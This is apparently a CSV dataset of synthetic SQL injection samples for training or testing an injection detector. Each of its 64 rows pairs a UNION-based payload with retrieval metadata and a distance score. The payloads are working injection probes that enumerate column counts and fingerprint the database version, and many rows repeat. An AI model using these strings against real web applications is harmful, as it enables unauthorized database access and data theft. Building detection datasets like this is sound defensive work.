id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000527,4.596319881826792
CTGAN_000002,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,4.293178794622534
CTGAN_000003,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000113,4.183270022588408
CTGAN_000004,attack,union,"1' where 1093  =  1093 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000527,5.046136376630611
CTGAN_000005,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000640,5.455872481934232
CTGAN_000006,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,4.36818472518363
CTGAN_000007,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000683,6.192380808458552
CTGAN_000008,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,4.833465032825788
CTGAN_000009,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000311,4.129642781410621
CTGAN_000010,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000624,4.222273111391845
CTGAN_000011,attack,union,"1   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000375,6.056018094833186
CTGAN_000012,attack,union,"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000753,4.992013864592753
CTGAN_000013,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,5.334035302651193
CTGAN_000014,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000446,4.308482629844555
CTGAN_000015,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000397,3.7909131686837094
CTGAN_000016,attack,union,"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",nearest_attack_euclidean,R000541,3.655209677572432
CTGAN_000017,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R000239,4.60788701331553
CTGAN_000018,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,4.268697770610555
CTGAN_000019,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.479410563647108
CTGAN_000020,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,6.2067626385351495
CTGAN_000021,attack,union,"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",nearest_attack_euclidean,R000281,5.595599161482619
CTGAN_000022,attack,union,"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",nearest_attack_euclidean,R000279,4.1212776571592515
CTGAN_000023,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,5.10836157342858
CTGAN_000024,attack,union,"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",nearest_attack_euclidean,R000212,5.095859101747344
CTGAN_000025,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000685,6.244983539656671
CTGAN_000026,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000471,5.061223723888335
CTGAN_000027,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000025,6.196198076436134
CTGAN_000028,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000369,5.458182507839442
CTGAN_000029,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,4.256740125122843
CTGAN_000030,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000124,4.788116708340389
CTGAN_000031,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000435,6.26458277647652
CTGAN_000032,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,4.404924547151616
CTGAN_000033,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000156,5.906894848623548
CTGAN_000034,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,4.4451283966575
CTGAN_000035,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000414,4.559495686651199
CTGAN_000036,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,4.359660385737874
CTGAN_000037,attack,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",nearest_attack_euclidean,R000734,3.7099141263283886
CTGAN_000038,attack,union,"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#",nearest_attack_euclidean,R000502,3.999781862822607
CTGAN_000039,attack,union,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",nearest_attack_euclidean,R000724,5.614166589205292
CTGAN_000040,attack,union,"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",nearest_attack_euclidean,R000688,4.8263631635389705
CTGAN_000041,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000040,7.876371567243015
CTGAN_000042,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000244,5.336186693967348
CTGAN_000043,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000157,4.765726942234658
CTGAN_000044,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R000681,5.2045576135693015
CTGAN_000045,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000019,5.988913057535549
CTGAN_000046,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,5.569475092628465
CTGAN_000047,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000761,4.886986747239185
CTGAN_000048,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,4.016846009053521
CTGAN_000049,attack,union,"1 where 2363  =  2363 union all select null,null,null,null,null--",nearest_attack_euclidean,R000647,3.5782693821887044
CTGAN_000050,attack,union,"1%'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000377,5.910185643658985
CTGAN_000051,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000741,3.219797540862048
CTGAN_000052,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,4.99177117530887
CTGAN_000053,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R000654,6.292894428343887
CTGAN_000054,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000752,5.309272283106029
CTGAN_000055,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000548,4.414981884987946
CTGAN_000056,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000244,4.794982038007445
CTGAN_000057,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000177,6.128422885079693
CTGAN_000058,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R000594,4.824812917506264
CTGAN_000059,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000720,6.504811065501827
CTGAN_000060,attack,union,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000265,4.055884424750412
CTGAN_000061,attack,union,"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",nearest_attack_euclidean,R000281,4.428265055956989
CTGAN_000062,attack,union,"1 where 6412  =  6412 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000422,2.926314998395739
CTGAN_000063,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,4.060585558053421
CTGAN_000064,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000115,4.448129470072191
